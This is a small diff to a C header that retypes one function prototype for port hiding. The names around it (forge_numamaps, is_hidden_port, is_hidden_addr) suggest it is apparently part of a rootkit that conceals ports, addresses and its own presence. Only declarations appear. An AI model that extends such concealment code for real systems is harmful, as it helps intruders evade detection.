@@ -21,7 +21,7 @@ FILE *forge_numamaps(const char *pathname);
 #endif
 
 #ifdef HIDE_PORTS
-int is_hidden_port(int port);
+int is_hidden_port(unsigned short port);
 #ifdef HIDE_ADDRS
 char *getanip(const char *addr);
 int is_hidden_addr(const char *addr);
